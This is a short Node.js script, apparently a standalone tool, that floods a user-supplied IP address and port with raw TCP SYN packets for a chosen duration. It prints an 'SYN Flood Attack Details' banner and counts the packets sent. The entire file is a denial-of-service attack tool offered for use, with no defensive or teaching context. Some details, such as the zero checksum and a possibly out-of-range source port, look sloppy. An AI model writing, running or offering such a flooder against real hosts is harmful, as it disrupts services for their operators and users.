const raw = require('raw-socket');
const process = require('process');
const { Buffer } = require('buffer');

const [,, targetIp, targetPort, duration] = process.argv;

const endtime = Date.now() + (duration ? duration * 1000 : 100000);
const sourcePort = Math.floor(Math.random() * 65535) + 1; 

const createPacket = () => {
    const packet = Buffer.alloc(40); 

    packet.writeUInt16BE(sourcePort, 0);
    packet.writeUInt16BE(targetPort, 2); 
    packet.writeUInt32BE(0, 4); 
    packet.writeUInt32BE(0, 8); 
    packet.writeUInt16BE(0x5000, 12); 
    packet.writeUInt16BE(0xFFFF, 14); 
    packet.writeUInt16BE(0, 16);
    packet.writeUInt16BE(0, 18);

    packet.writeUInt8(0x02, 13);

    return packet;
};

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(' '.repeat((width - 30) / 2) + "SYN Flood Attack Details");
    console.log(' '.repeat((width - 40) / 2) + "╔════════════════════════════════╗");
    console.log(' '.repeat((width - 40) / 2) + ` Target IP: ${targetIp}`);
    console.log(' '.repeat((width - 40) / 2) + ` Target Port: ${targetPort}`);
    console.log(' '.repeat((width - 40) / 2) + ` Duration: ${duration} seconds`);
    console.log(' '.repeat((width - 40) / 2) + ` Method: SYN Flood`);
    console.log(' '.repeat((width - 40) / 2) + "╚════════════════════════════════╝");
};

printAttackDetails();

let packetCount = 0;

const socket = raw.createSocket({
    protocol: raw.Protocol.TCP,
    family: raw.Family.IPv6
});

socket.on('message', (msg, rinfo) => {
});

const sendPackets = () => {
    if (Date.now() > endtime) {
        console.log(`Total packets sent: ${packetCount}`);
        socket.close();
        return;
    }

    const packet = createPacket();
    socket.send(packet, 0, packet.length, targetPort, targetIp, (err) => {
        if (err) {
            console.error('Error sending packet:', err);
            socket.close();
        } else {
            packetCount++;
            setImmediate(sendPackets);
        }
    });
};

sendPackets();
